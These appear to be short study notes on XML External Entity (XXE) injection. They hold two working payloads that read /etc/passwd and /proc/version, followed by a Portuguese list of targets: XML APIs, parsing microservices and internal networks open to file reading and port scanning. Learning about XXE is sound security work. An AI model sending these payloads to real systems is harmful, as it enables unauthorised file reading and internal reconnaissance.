<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/version">
]>
<root>&xxe;</root>


Onde essa vulnerabilidade pode ser explorada:
- APIs ou formulários que recebem XML
- Serviços de parsing centralizados: microserviços que recebem XML para processar documentos, faturas eletrônicas
- Ambientes internos com acesso a arquivos sensíveis ou rede: o hacker pode ler arquivos internos, fazer 'port scanning' da rede interna.